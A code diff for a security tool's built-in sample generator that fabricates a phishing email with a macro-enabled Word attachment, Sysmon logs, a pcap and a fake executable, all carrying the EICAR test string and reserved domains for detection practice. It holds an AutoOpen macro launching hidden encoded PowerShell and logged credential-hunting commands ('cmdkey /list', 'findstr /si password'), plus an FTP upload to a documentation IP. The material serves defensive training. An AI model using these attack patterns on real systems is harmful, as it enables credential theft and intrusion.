@@ -1,33 +1,78 @@
 """Sample files built into SO-CRATES, for the Welcome screen's sample
 buttons that work with no internet access (POST /api/load-sample).
 
-Each sample is generated on request, not shipped as a file. The binary
-and email samples carry the EICAR antivirus test string (the binary
-sample is just that file), and building them here - with the string
-split in this source - means no file in the container image contains the
+Each sample is generated on request, not shipped as a file. The email's
+attachment, the pcap's payload and the binary sample carry the EICAR
+antivirus test string, and building them here - with the string split in
+this source - means no file in the container image contains the
 signature for a scanner to flag or quarantine. It only exists in full in
 an analysis directory once someone loads a sample.
 
 All four use only reserved .example domains and documentation-range IPs
-(RFC 2606, RFC 5737), and tell one story: the email lands, Jordan opens
-the attachment, the log is what happened on the workstation next, and
-the pcap is that workstation downloading the payload and exfiltrating
-stolen credentials.
+(RFC 2606, RFC 5737), and tell one story (docs/usage/analyzing-files.md):
+a phishing email delivers a macro document (email); opening it on
+Jordan's workstation starts PowerShell, which downloads a payload that
+persists and harvests saved credentials (log); the download and the
+credentials' FTP upload are on the wire (pcap); and the payload itself
+is the binary sample.
 
 Samples are byte-for-byte deterministic, so loading one twice reopens the
 same analysis (same MD5) instead of creating another.
 """
 
+import io
 import json
 import random
 import socket
 import struct
+import zipfile
 from email.message import EmailMessage
 from email.policy import SMTP
 
 # The EICAR test string - a harmless file antivirus and YARA rulesets flag
 # by design - in two halves, so this file itself never matches.
 EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+
+
+def _macro_document():
+    """A minimal macro-enabled Word document (.docm): an Office Open XML
+    zip whose vbaProject.bin holds an AutoOpen macro - in place of the
+    real compiled VBA, the macro's source and the EICAR string, stored
+    uncompressed so YARA sees them. Fixed timestamps keep it
+    deterministic."""
+    parts = {
+        '[Content_Types].xml': (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+            '<Default Extension="xml" ContentType="application/xml"/>'
+            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
+            '<Override PartName="/word/document.xml" '
+            'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
+            '</Types>').encode(),
+        '_rels/.rels': (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+            'relationships/officeDocument" Target="word/document.xml"/></Relationships>').encode(),
+        'word/document.xml': (
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+            '<w:body><w:p><w:r><w:t>Payroll Adjustment Form - enable editing and content to view.'
+            '</w:t></w:r></w:p></w:body></w:document>').encode(),
+        'word/vbaProject.bin': (
+            b'Attribute VB_Name = "ThisDocument"\r\n'
+            b'Sub AutoOpen()\r\n'
+            b'    Shell "powershell.exe -nop -w hidden -enc SQBFAFgA...", vbHide\r\n'
+            b'End Sub\r\n' + EICAR),
+    }
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w') as zf:
+        for name, data in parts.items():
+            info = zipfile.ZipInfo(name, date_time=(2026, 2, 2, 17, 5, 0))
+            info.compress_type = zipfile.ZIP_STORED
+            zf.writestr(info, data)
+    return buf.getvalue()
 
 
 def _fix_boundaries(msg, prefix):
@@ -42,8 +87,8 @@ def build_email_sample():
     """A phishing message that exercises every part of email analysis: a
     spoofed sender with a Reply-To and Return-Path elsewhere, failing SPF
     and DMARC, a link whose text names a different domain than it goes
-    to, an executable attachment (the EICAR test file) and a forwarded
-    message. Only reserved .example domains and documentation-range IPs
+    to, a macro-enabled Word attachment (carrying the EICAR string, so
+    YARA flags it) and a forwarded message. Only reserved .example domains and documentation-range IPs
     (RFC 2606, RFC 5737), so nothing in it points at a real organization."""
     earlier = EmailMessage()
     earlier['Date'] = 'Mon, 02 Feb 2026 16:12:09 +0000'
@@ -92,18 +137,20 @@ def build_email_sample():
         '<p>Questions? Visit our <a href="https://help.northbridgepay.example/payroll">Help Center</a>.</p>'
         '<p>Northbridge Payroll Services</p>'
         '</body></html>', subtype='html')
-    msg.add_attachment(EICAR, maintype='application', subtype='octet-stream',
-                       filename='Payroll_Adjustment_Form.exe')
+    msg.add_attachment(_macro_document(), maintype='application',
+                       subtype='vnd.ms-word.document.macroEnabled.12',
+                       filename='Payroll_Adjustment_Form.docm')
     msg.add_attachment(earlier)
     _fix_boundaries(msg, 'SO-CRATES-sample')
     return msg.as_bytes(policy=SMTP)
 
 
 def build_binary_sample():
-    """The EICAR test file - byte-for-byte what eicar.org serves as
-    eicar.com, which the Sample binary file used to download (so an
-    existing analysis of it is reopened, not duplicated)."""
-    return EICAR
+    """The payload the log and pcap samples download as update.exe: a fake
+    executable (it doesn't run) carrying the EICAR string - byte-for-byte
+    what Suricata extracts from the pcap sample, so the hashes match
+    across the two analyses."""
+    return _fake_pe(EICAR)
 
 
 _SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': 'Microsoft-Windows-Sysmon',
@@ -126,10 +173,11 @@ def _process(time, pid, image, command_line, parent_pid, parent_image, parent_co
 def build_log_sample():
     """Sysmon events, one JSON object per line, from the workstation that
     opened the sample email's payroll form: Word starts encoded PowerShell,
-    certutil downloads a payload from the email's originating IP, and the
-    payload enumerates the user, persists (scheduled task and Run key) and
-    deletes shadow copies. Built to fire long-standing SigmaHQ rules -
-    18 alerts, high to low, with the built-in ruleset when written."""
+    certutil downloads the payload from the email's originating IP, and the
+    payload enumerates the user, persists (scheduled task and Run key),
+    hunts for saved credentials and connects out to upload them by FTP -
+    the connection the pcap sample shows. Built to fire long-standing
+    SigmaHQ rules with the built-in ruleset."""
     events = [
         _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
                  '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
@@ -155,8 +203,15 @@ def build_log_sample():
              TargetObject='HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft'
                           '\\Windows\\CurrentVersion\\Run\\PayrollUpdater',
              Details=_DROPPED),
-        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\vssadmin.exe',
-                 'vssadmin.exe delete shadows /all /quiet', 7302, _DROPPED, _DROPPED),
+        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\cmdkey.exe', 'cmdkey /list',
+                 7570, _CMD, 'cmd.exe /c cmdkey /list'),
+        _process('2026-02-03T08:45:52.317Z', 7612, 'C:\\Windows\\System32\\findstr.exe',
+                 'findstr /si password *.xml *.ini *.txt *.config', 7598, _CMD,
+                 'cmd.exe /c cd C:\\Users\\jordan.lee && findstr /si password *.xml *.ini *.txt *.config'),
+        # The upload the pcap sample shows - harvested credentials, by FTP.
+        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:46:10.204Z', ProcessId=7302,
+             Image=_DROPPED, User='CORP\\jordan.lee', Protocol='tcp', Initiated='true',
+             SourceIp='10.20.4.12', SourcePort=51790, DestinationIp='203.0.113.66', DestinationPort=21),
     ]
     return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()
 
@@ -245,7 +300,7 @@ def build_pcap_sample():
     download rules (5 alerts with the built-in ruleset when written), and
     Suricata's extracted copy of the payload gets YARA hits."""
     cap = _Capture(start=1770108270.0)  # 2026-02-03T08:44:30Z, matching the log sample
-    payload = _fake_pe(EICAR)
+    payload = build_binary_sample()
     cap.session(51733, 80, [
         (True, b'GET /update.bin HTTP/1.1\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n'
                b'Pragma: no-cache\r\nAccept: */*\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n'
@@ -277,7 +332,7 @@ def build_pcap_sample():
 # POST /api/load-sample accepts.
 SAMPLES = {
     'pcap': ('sample-workstation-traffic.pcap', build_pcap_sample),
-    'binary': ('eicar.com', build_binary_sample),
+    'binary': ('update.exe', build_binary_sample),
     'log': ('sample-sysmon-log.json', build_log_sample),
     'email': ('sample-phishing-email.eml', build_email_sample),
 }
